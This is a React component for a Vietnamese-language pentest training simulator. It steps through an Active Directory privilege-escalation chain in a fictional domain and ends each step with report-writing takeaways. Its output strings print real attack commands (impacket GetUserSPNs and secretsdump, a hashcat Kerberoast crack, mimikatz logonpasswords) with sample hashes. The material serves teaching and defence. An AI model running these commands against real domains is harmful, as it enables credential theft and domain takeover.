import { useState } from 'react';
import SimHow from './SimHow';

type AdStep = 'graph' | 'ticket' | 'credential' | 'host' | 'domain';

const PATH: Array<{ id: AdStep; title: string; fact: string; need?: AdStep; output: string; takeaway: string }> = [
  {
    id: 'graph',
    title: 'Dựng đồ thị quyền từ tài khoản nhân viên thường',
    fact: 'jdoe → svc_sql → SQL01 → admin_dom (Domain Admin)',
    output: '[BloodHound] Shortest path to Domain Admins:\n  jdoe --MemberOf--> SQL Admins\n  svc_sql (có SPN: MSSQL/sql01) --AdminTo--> SQL01.megacorp.lab\n  SQL01.megacorp.lab --HasSession--> admin_dom@MEGACORP.LAB',
    takeaway: 'Ý nghĩa điều tra: Chỉ với tài khoản thường jdoe, BloodHound đã nối được các quyền rời rạc thành một lộ trình 3 chặng rõ ràng lên thẳng Domain Admin.',
  },
  {
    id: 'ticket',
    title: 'Xin vé dịch vụ của svc_sql (Kerberoasting)',
    fact: 'Tài khoản dịch vụ svc_sql có gắn SPN',
    need: 'graph',
    output: '$ impacket-GetUserSPNs -request -dc-ip 10.10.14.50 megacorp.lab/jdoe\nServicePrincipalName  Name     MemberOf\nMSSQL/sql01           svc_sql  CN=SQL Admins\n$krb5tgs$23$*svc_sql*MEGACORP.LAB*$hoRtE9k...',
    takeaway: 'Ý nghĩa điều tra: Theo thiết kế của Kerberos, bất kỳ ai trong miền cũng xin được vé dịch vụ (TGS) của svc_sql. Bản thân việc lấy được vé chưa cho quyền mới ngay, nhưng cho ta dữ liệu để đem về máy mình dò mật khẩu ngoại tuyến.',
  },
  {
    id: 'credential',
    title: 'Bẻ khoá vé ngoại tuyến tìm mật khẩu svc_sql',
    fact: 'Mật khẩu của svc_sql đặt yếu và lâu năm không đổi',
    need: 'ticket',
    output: '$ hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt\n$krb5tgs$23$*svc_sql*...:P@ssw0rd2019\nStatus...........: Cracked',
    takeaway: 'Nguyên nhân gốc cần ghi vào báo cáo: Lỗi không nằm ở giao thức Kerberos mà ở việc tài khoản dịch vụ svc_sql dùng mật khẩu con người tự đặt quá yếu (lẽ ra nên chuyển sang gMSA với mật khẩu dài tự động xoay vòng).',
  },
  {
    id: 'host',
    title: 'Bước lên máy chủ SQL01 và kiểm tra phiên đang mở',
    fact: 'svc_sql có quyền quản trị trên máy SQL01',
    need: 'credential',
    output: 'C:\\Windows\\system32> whoami\nnt authority\\system\n\nmimikatz # sekurlsa::logonpasswords\n  * Username : admin_dom\n  * Domain   : MEGACORP\n  * NTLM     : aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931...',
    takeaway: 'Nguyên nhân gốc cần ghi vào báo cáo: Trong AD, chiếm được một máy chủ trung gian chưa phải điểm dừng — máy đó là nơi trích xuất thông tin đăng nhập tiếp theo. Lỗi ở đây là quản trị viên đã dùng tài khoản Domain Admin (admin_dom) đăng nhập trực tiếp lên máy chủ ứng dụng SQL01.',
  },
  {
    id: 'domain',
    title: 'Dùng quyền của admin_dom để đồng bộ hash toàn miền (DCSync)',
    fact: 'admin_dom có quyền yêu cầu DC đồng bộ dữ liệu mật khẩu',
    need: 'host',
    output: '$ impacket-secretsdump -hashes :31d6cfe0... megacorp.lab/admin_dom@10.10.14.50\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435...:c0ffee123456...:::\nkrbtgt:502:aad3b435...:9876fedcba00...:::',
    takeaway: 'Tổng kết chuỗi báo cáo: Toàn bộ miền sập không phải vì một lỗi phần mềm nào trên Domain Controller, mà vì 3 lỗi cấu hình nối đuôi nhau. Khi viết báo cáo, hãy tách riêng từng mắt xích để khách hàng chặn ở nhiều lớp cùng lúc.',
  },
];

const INITIAL_MSG = 'Hãy bấm vào mắt xích số 1 để bắt đầu lần theo đồ thị quyền từ tài khoản jdoe.';

export default function AdPathLab() {
  const [done, setDone] = useState<AdStep[]>([]);
  const [message, setMessage] = useState(INITIAL_MSG);

  function advance(step: (typeof PATH)[number]) {
    if (step.need && !done.includes(step.need)) {
      setMessage('Bạn chưa đi qua mắt xích phía trước nên chưa có đủ thông tin hoặc quyền hạn cho bước này. Hãy bấm theo thứ tự từng chặng trên đường đi.');
      return;
    }
    if (!done.includes(step.id)) {
      setDone((current) => [...current, step.id]);
    }
    setMessage(`${step.output}\n\n${step.takeaway}`);
  }

  function reset() {
    setDone([]);
    setMessage(INITIAL_MSG);
  }

  return (
    <div className="sim ad-path-lab">
      <p className="sim-title">Lần theo từng mắt xích trong miền megacorp.lab</p>
      <SimHow steps={['Bấm lần lượt từng mắt xích từ 1 đến 5 để xem kết quả thu được ở mỗi bước và lý do vì sao bước trước mở đường cho bước sau.', 'Chú ý phần nhận xét ở cuối khung đen: đó là cách tách một chuỗi liên hoàn thành các mục phát hiện rõ ràng trong báo cáo.']} />
      <p className="muted small">
        Xuất phát từ tài khoản nhân viên thường <code>jdoe</code>, bạn không thể chạm thẳng vào Domain Controller ngay. Hãy đi qua từng cầu nối để thấy các quyền hợp lệ ghép lại thành đường chiếm cả miền như thế nào.
      </p>
      <ol className="ad-path">
        {PATH.map((step, index) => (
          <li key={step.id} className={done.includes(step.id) ? 'done' : ''}>
            <button type="button" onClick={() => advance(step)}>
              <span>{done.includes(step.id) ? '✓' : index + 1}</span>
              <b>{step.title}</b>
              <small>{step.fact}</small>
            </button>
          </li>
        ))}
      </ol>
      <pre className="ad-path-output" aria-live="polite">{message}</pre>
      {done.length > 0 && (
        <div className="sim-controls">
          <button type="button" className="btn" onClick={reset}>
            Làm lại
          </button>
        </div>
      )}
    </div>
  );
}
